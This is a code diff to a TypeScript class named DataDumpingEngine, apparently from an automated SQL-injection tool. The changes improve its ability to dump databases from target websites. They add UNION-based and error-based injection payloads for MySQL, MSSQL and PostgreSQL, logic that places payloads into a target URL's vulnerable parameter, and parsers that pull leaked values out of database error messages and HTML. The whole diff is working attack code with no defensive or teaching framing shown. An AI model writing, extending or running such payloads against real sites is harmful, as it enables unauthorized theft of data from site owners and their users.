@@ -372,24 +372,33 @@ export class DataDumpingEngine {
       const result = await makeRequest(url, {
         signal: this.context.signal,
         maxRedirects: 5,
+        timeout: 10000,
       });
       
-      if (result.error || result.status >= 400) return null;
-      
-      // Extract from error messages
+      // Extract from error messages - MySQL EXTRACTVALUE returns data between markers
       const patterns = [
+        /XPATH syntax error: '~(.+?)~'/i,  // EXTRACTVALUE marker
         /Duplicate entry '(.+?)' for key/i,
-        /XPATH syntax error: '(.+?)'/i,
         /conversion failed when converting.*?'(.+?)'/i,
         /"(.+?)".*?for key/i,
+        /Error: (.+?)<br/i,
+        /Warning: (.+?)<br/i,
+        /SQLSTATE\[.+?\]: (.+?)<br/i,
       ];
       
       for (const pattern of patterns) {
         const match = result.body.match(pattern);
-        if (match) return match[1];
+        if (match && match[1]) {
+          // Clean up the extracted value
+          let value = match[1].trim();
+          // Remove any trailing error text
+          value = value.split(/\s+(in|at|on line)/i)[0];
+          return value;
+        }
       }
       
-      return null;
+      // Fallback: Try to extract from HTML
+      return this.extractFromHTML(result.body);
     } catch (error) {
       return null;
     }
@@ -502,26 +511,46 @@ export class DataDumpingEngine {
    * Build payloads for different techniques
    */
   private buildUnionPayload(query: string): string {
-    const dbType = this.context.dbType;
+    // Use the original payload structure from vulnerability
+    const basePayload = this.context.injectionPoint;
     
-    // Detect number of columns (assume pre-detected)
-    const columnCount = 5; // Default, should be detected
+    // If injection point has placeholder, replace it
+    if (basePayload.includes("*INJECT*")) {
+      const columnCount = 5; // TODO: Auto-detect
+      const nulls = Array(columnCount - 1).fill("NULL").join(",");
+      const unionPayload = `' UNION ALL SELECT ${nulls},CONCAT('~~SQLIDUMPER~~',(${query}),'~~SQLIDUMPER~~')-- -`;
+      return basePayload.replace("*INJECT*", unionPayload);
+    }
+    
+    // Otherwise append to injection point
+    const columnCount = 5;
     const nulls = Array(columnCount - 1).fill("NULL").join(",");
-    
-    return `${this.context.injectionPoint} UNION ALL SELECT ${nulls},CONCAT('~~SQLIDUMPER~~',(${query}),'~~SQLIDUMPER~~')`;
+    return `${basePayload}' UNION ALL SELECT ${nulls},CONCAT('~~SQLIDUMPER~~',(${query}),'~~SQLIDUMPER~~')-- -`;
   }
 
   private buildErrorPayload(query: string): string {
     const dbType = this.context.dbType;
+    const basePayload = this.context.injectionPoint;
+    
+    let errorPayload = "";
     
     if (dbType === "mysql") {
-      return `${this.context.injectionPoint} AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((${query}),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)`;
+      // MySQL Error-based: EXTRACTVALUE or UPDATEXML
+      errorPayload = `' AND EXTRACTVALUE(1,CONCAT(0x7e,(${query}),0x7e))-- -`;
     } else if (dbType === "mssql") {
-      return `${this.context.injectionPoint} AND 1=CAST((${query}) AS int)`;
+      errorPayload = `' AND 1=CAST((${query}) AS int)-- -`;
+    } else if (dbType === "postgresql") {
+      errorPayload = `' AND CAST((${query}) AS numeric)=1-- -`;
     } else {
       // Generic error-based
-      return `${this.context.injectionPoint} AND EXTRACTVALUE(1,CONCAT(0x7e,(${query})))`;
+      errorPayload = `' AND EXTRACTVALUE(1,CONCAT(0x7e,(${query})))-- -`;
     }
+    
+    if (basePayload.includes("*INJECT*")) {
+      return basePayload.replace("*INJECT*", errorPayload);
+    }
+    
+    return `${basePayload}${errorPayload}`;
   }
 
   private buildCountQuery(database: string, table: string): string {
@@ -536,9 +565,33 @@ export class DataDumpingEngine {
    * Inject payload into target URL
    */
   private injectPayload(payload: string): string {
-    const url = new URL(this.context.targetUrl);
-    url.searchParams.set(this.context.vulnerableParameter, payload);
-    return url.toString();
+    try {
+      const url = new URL(this.context.targetUrl);
+      
+      // Check if parameter exists in query string
+      if (url.searchParams.has(this.context.vulnerableParameter)) {
+        // Replace existing parameter
+        url.searchParams.set(this.context.vulnerableParameter, payload);
+      } else {
+        // Check if it's in the path (like /page.php?id=1)
+        const urlStr = this.context.targetUrl;
+        const paramPattern = new RegExp(`([?&])${this.context.vulnerableParameter}=([^&]*)`);
+        
+        if (paramPattern.test(urlStr)) {
+          // Replace in full URL string
+          return urlStr.replace(paramPattern, `$1${this.context.vulnerableParameter}=${encodeURIComponent(payload)}`);
+        } else {
+          // Append as new parameter
+          url.searchParams.set(this.context.vulnerableParameter, payload);
+        }
+      }
+      
+      return url.toString();
+    } catch (error) {
+      // If URL parsing fails, append to string
+      const separator = this.context.targetUrl.includes('?') ? '&' : '?';
+      return `${this.context.targetUrl}${separator}${this.context.vulnerableParameter}=${encodeURIComponent(payload)}`;
+    }
   }
 
   /**
@@ -555,10 +608,32 @@ export class DataDumpingEngine {
    * Extract value from HTML response
    */
   private extractFromHTML(html: string): string | null {
-    // Remove HTML tags and look for data
-    const text = html.replace(/<[^>]+>/g, " ");
-    const match = text.match(/\b[a-zA-Z0-9_]{3,50}\b/);
-    return match ? match[0] : null;
+    // Look for SQLIDUMPER markers first
+    const markerMatch = html.match(/~~SQLIDUMPER~~(.+?)~~SQLIDUMPER~~/);
+    if (markerMatch) return markerMatch[1];
+    
+    // Remove HTML tags and scripts
+    let text = html.replace(/<script[^>]*>.*?<\/script>/gis, '');
+    text = text.replace(/<style[^>]*>.*?<\/style>/gis, '');
+    text = text.replace(/<[^>]+>/g, ' ');
+    text = text.replace(/\s+/g, ' ').trim();
+    
+    // Look for database-like strings (alphanumeric, underscores, common in DB names)
+    const dbPattern = /\b([a-zA-Z][a-zA-Z0-9_]{2,30})\b/g;
+    const matches = text.match(dbPattern);
+    
+    if (matches && matches.length > 0) {
+      // Filter out common HTML/JS keywords
+      const filtered = matches.filter(m => 
+        !['function', 'return', 'document', 'window', 'null', 'undefined', 'true', 'false'].includes(m.toLowerCase())
+      );
+      
+      if (filtered.length > 0) {
+        return filtered[0]; // Return first meaningful match
+      }
+    }
+    
+    return null;
   }
 
   /**
